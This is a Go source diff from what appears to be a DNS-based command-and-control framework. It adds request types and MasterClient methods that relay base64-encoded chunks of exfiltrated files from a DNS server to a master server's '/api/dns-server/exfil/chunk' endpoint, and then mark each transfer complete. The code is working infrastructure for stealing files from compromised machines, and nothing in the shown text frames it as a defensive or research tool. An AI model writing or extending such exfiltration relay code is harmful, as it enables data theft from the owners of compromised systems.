@@ -126,6 +126,30 @@ type ResultSubmitRequest struct {
 	Data        string `json:"data"`
 }
 
+type ExfilChunkRequest struct {
+	DNSServerID string `json:"dns_server_id"`
+	APIKey      string `json:"api_key"`
+	SessionID   string `json:"session_id"`
+	JobID       string `json:"job_id"`
+	ChunkIndex  int    `json:"chunk_index"`
+	TotalChunks int    `json:"total_chunks"`
+	PayloadB64  string `json:"payload_b64"`
+	FileName    string `json:"file_name,omitempty"`
+	FileSize    int64  `json:"file_size,omitempty"`
+	IsFinal     bool   `json:"is_final"`
+}
+
+type ExfilCompleteRequest struct {
+	DNSServerID    string `json:"dns_server_id"`
+	APIKey         string `json:"api_key"`
+	SessionID      string `json:"session_id"`
+	JobID          string `json:"job_id"`
+	FileName       string `json:"file_name,omitempty"`
+	FileSize       int64  `json:"file_size,omitempty"`
+	TotalChunks    int    `json:"total_chunks"`
+	ReceivedChunks int    `json:"received_chunks"`
+}
+
 type TaskResponse struct {
 	ID       string `json:"id"`
 	BeaconID string `json:"beacon_id"`
@@ -412,6 +436,50 @@ func (mc *MasterClient) SubmitResult(taskID, beaconID string, chunkIndex, totalC
 	}
 
 	return taskComplete, nil
+}
+
+// SubmitExfilChunk forwards a dedicated exfil client chunk to the Master Server
+func (mc *MasterClient) SubmitExfilChunk(req ExfilChunkRequest) error {
+	req.DNSServerID = mc.serverID
+	req.APIKey = mc.apiKey
+
+	respData, err := mc.doRequest("POST", "/api/dns-server/exfil/chunk", req)
+	if err != nil {
+		return fmt.Errorf("exfil chunk submit failed: %w", err)
+	}
+
+	var resp APIResponse
+	if err := json.Unmarshal(respData, &resp); err != nil {
+		return fmt.Errorf("failed to parse exfil chunk response: %w", err)
+	}
+
+	if !resp.Success {
+		return fmt.Errorf("exfil chunk rejected: %s", resp.Message)
+	}
+
+	return nil
+}
+
+// MarkExfilComplete notifies the Master Server that a session finished transferring
+func (mc *MasterClient) MarkExfilComplete(req ExfilCompleteRequest) error {
+	req.DNSServerID = mc.serverID
+	req.APIKey = mc.apiKey
+
+	respData, err := mc.doRequest("POST", "/api/dns-server/exfil/complete", req)
+	if err != nil {
+		return fmt.Errorf("exfil completion submit failed: %w", err)
+	}
+
+	var resp APIResponse
+	if err := json.Unmarshal(respData, &resp); err != nil {
+		return fmt.Errorf("failed to parse exfil completion response: %w", err)
+	}
+
+	if !resp.Success {
+		return fmt.Errorf("exfil completion rejected: %s", resp.Message)
+	}
+
+	return nil
 }
 
 // MarkTaskComplete notifies the Master that the beacon has finished exfiltrating all chunks
